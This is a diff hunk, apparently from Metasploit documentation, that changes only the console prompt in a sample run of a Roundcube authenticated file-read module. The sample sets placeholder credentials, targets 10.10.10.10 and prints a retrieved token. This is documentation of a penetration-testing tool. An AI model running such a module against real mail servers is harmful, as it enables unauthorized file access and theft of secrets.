@@ -125,7 +125,7 @@ resource (msf)> set USERNAME roundcube_user
 USERNAME => roundcube_user
 resource (msf)> set PASSWORD roundcube_password
 PASSWORD => roundcube_password
-msf6 auxiliary(gather/roundcube_auth_file_read) > run
+msf auxiliary(gather/roundcube_auth_file_read) > run
 [*] Running module against 10.10.10.10
 
 [+] Token Value: JDGak0VjivacBBT9FVJbN4eqaelDHLX0
